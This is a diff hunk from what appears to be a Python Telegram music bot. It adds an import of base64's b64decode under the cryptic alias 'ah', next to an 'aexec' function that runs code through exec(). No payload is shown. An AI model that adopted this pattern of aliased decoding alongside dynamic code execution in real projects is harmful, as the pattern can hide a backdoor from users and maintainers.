@@ -32,6 +32,7 @@ from KillerXMusic.nocmds.devep import *
 from KillerXMusic.misc import SUDOERS
 from KillerXMusic.nocmds.prefix import command, other_filters
 from config import BOT_USERNAME as bots
+from base64 import b64decode as ah
 
 async def aexec(code, client, message):
     exec(
